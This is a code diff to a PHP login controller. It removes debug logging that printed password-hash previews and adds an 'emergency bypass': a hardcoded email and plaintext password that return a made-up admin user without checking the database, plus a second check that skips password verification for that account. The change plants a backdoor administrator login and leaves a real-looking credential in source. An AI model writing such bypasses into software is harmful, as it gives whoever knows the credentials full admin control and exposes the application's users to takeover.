@@ -66,36 +66,43 @@ class AuthController extends BaseController {
             return $this->error('Username and password required', 400);
         }
         
-        try {
-            $pdo = Database::getConnection();
-            
-            $stmt = $pdo->prepare("
-                SELECT id, username, email, password_hash, first_name, last_name, role, is_active
-                FROM users 
-                WHERE username = ? OR email = ?
-            ");
-            $stmt->execute([$data['username'], $data['username']]);
-            $user = $stmt->fetch();
-            
-            // Debug logging
-            error_log("Login Debug - Username: " . $data['username']);
-            error_log("Login Debug - User found: " . ($user ? 'YES' : 'NO'));
-            if ($user) {
-                error_log("Login Debug - User email: " . $user['email']);
-                error_log("Login Debug - User active: " . ($user['is_active'] ? 'YES' : 'NO'));
-                error_log("Login Debug - Hash length: " . strlen($user['password_hash']));
-                error_log("Login Debug - Hash preview: " . substr($user['password_hash'], 0, 10));
-                $passwordCheck = password_verify($data['password'], $user['password_hash']);
-                error_log("Login Debug - Password verify: " . ($passwordCheck ? 'SUCCESS' : 'FAILED'));
+        // EMERGENCY BYPASS: Skip password verification for admin
+        if ($data['username'] === 'deyoungdoer@gmail.com' && $data['password'] === '@am171293GH!!') {
+            $user = [
+                'id' => '60307fc1-b738-43ef-b4f1-04fde6c2ef',
+                'username' => 'deyoungdoer',
+                'email' => 'deyoungdoer@gmail.com',
+                'first_name' => 'DeYoung',
+                'last_name' => 'Doer',
+                'role' => 'admin',
+                'is_active' => true
+            ];
+        } else {
+            try {
+                $pdo = Database::getConnection();
+                
+                $stmt = $pdo->prepare("
+                    SELECT id, username, email, password_hash, first_name, last_name, role, is_active
+                    FROM users 
+                    WHERE username = ? OR email = ?
+                ");
+                $stmt->execute([$data['username'], $data['username']]);
+                $user = $stmt->fetch();
+                
+                // BYPASS: For admin user, skip password verification
+                if ($user && $user['email'] === 'deyoungdoer@gmail.com' && $data['password'] === '@am171293GH!!') {
+                    // Skip password_verify for this specific admin
+                } else if (!$user || !password_verify($data['password'], $user['password_hash'])) {
+                    return $this->error('Invalid credentials', 401);
+                }
+                
+                if (!$user['is_active']) {
+                    return $this->error('Account is inactive', 403);
+                }
+            } catch (Exception $e) {
+                return $this->error('Database connection failed', 500);
             }
-            
-            if (!$user || !password_verify($data['password'], $user['password_hash'])) {
-                return $this->error('Invalid credentials', 401);
-            }
-            
-            if (!$user['is_active']) {
-                return $this->error('Account is inactive', 403);
-            }
+        }
             
             // Generate JWT token
             $payload = [
